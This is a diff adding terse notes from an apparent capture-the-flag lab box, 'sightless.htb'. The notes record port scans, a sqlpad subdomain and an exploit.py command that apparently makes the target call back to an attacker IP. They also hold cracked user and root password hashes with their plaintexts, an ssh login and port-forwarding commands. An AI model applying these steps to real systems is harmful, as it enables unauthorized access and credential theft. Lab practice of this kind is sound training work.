@@ -1,0 +1,40 @@
+- port open
+	10.10.11.32:21
+	10.10.11.32:22
+	10.10.11.32:80
+- hostname: http://sightless.htb/
+
+- file hinden
+
+
+- subdomain
+	http://sqlpad.sightless.htb/
+
+- run python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.93 8000
+
+user:
+	michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/ -> password: insaneclownposse
+
+	root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b. -> password: blindside
+
+ssh michael@10.10.11.32 insaneclownposse
+
+ssh -L 8899:10.10.11.32:8080 michael@10.10.11.32
+
+ssh -L 40405:10.10.11.32:40405 michael@10.10.11.32
+
+netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:40405         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:44971         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:39885         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -    
